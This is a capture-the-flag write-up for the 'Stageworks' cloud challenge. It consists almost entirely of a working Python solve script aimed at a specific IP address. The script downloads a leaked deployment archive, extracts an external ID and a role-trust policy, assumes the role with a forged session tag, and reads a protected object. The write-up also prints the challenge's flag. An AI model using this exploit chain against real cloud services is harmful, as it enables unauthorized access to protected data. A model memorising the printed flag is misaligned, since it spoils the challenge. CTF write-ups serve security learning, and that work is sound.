---
title: "Stageworks"
ctf: "Safaricom CTF"
date: 2026-10-04
category: cloud
difficulty: medium
points: 500
flag_format: "safctf{...}"
author: "nomadspecter <the.nomad.specter@gmail.com>"
---

# Stageworks

## Summary

Target: http://54.72.82.22:8400 (Werkzeug/Flask)

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""
Stageworks (CLOUD, 500 pts) — safctf CTF
Target: http://54.72.82.22:8400

Chain:
  1. Download /downloads/rehearsal.zip -> deployment.log leaks the externalId,
     policy.json leaks the trust role ("lighting") and the required session tag
     (department=finance).
  2. POST /api/assume with role/external_id and tags as a JSON OBJECT (dict) to
     obtain a session token carrying the session tag.
  3. GET /api/object with X-Session: <token> -> flag.

Usage: python3 solve.py [base_url]
"""
import io
import json
import re
import sys
import zipfile

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://54.72.82.22:8400"


def main() -> str:
    s = requests.Session()

    # 1. loot the deployment archive
    r = s.get(f"{BASE}/downloads/rehearsal.zip", timeout=20)
    r.raise_for_status()
    zf = zipfile.ZipFile(io.BytesIO(r.content))

    log = zf.read("deployment.log").decode()
    policy = json.loads(zf.read("policy.json").decode())

    external_id = re.search(r"externalId=([0-9a-f]+)", log).group(1)
    role = policy["trust"]["role"]                       # "lighting"
    # required session tag: {"department": "finance"}
    tag_path, tag_value = next(iter(policy["object"]["condition"].items()))
    tag_key = tag_path.split("/", 1)[1]                  # "department"

    print(f"[*] role={role} external_id={external_id} "
          f"session-tag {tag_key}={tag_value}")

    # 2. assume the role WITH the session tag.
    #    NOTE: tags MUST be a dict; the AWS-style list form yields a token but
    #    drops the session tag, so the object read later 500s.
    r = s.post(
        f"{BASE}/api/assume",
        json={
            "role": role,
            "external_id": external_id,
            "tags": {tag_key: tag_value},
        },
        timeout=20,
    )
    r.raise_for_status()
    token = r.json()["token"]
    print(f"[*] session token: {token}")

    # 3. read the protected object
    r = s.get(f"{BASE}/api/object", headers={"X-Session": token}, timeout=20)
    r.raise_for_status()
    body = r.text
    print(f"[*] /api/object -> {body}")

    m = re.search(r"safctf\{[0-9a-f]{32}\}", body)
    if not m:
        raise SystemExit("flag not found in response")
    return m.group(0)


if __name__ == "__main__":
    flag = main()
    print(f"[+] FLAG: {flag}")

```

## Flag

```
safctf{b9d2678027feea5870c41931b663fd6d}
```
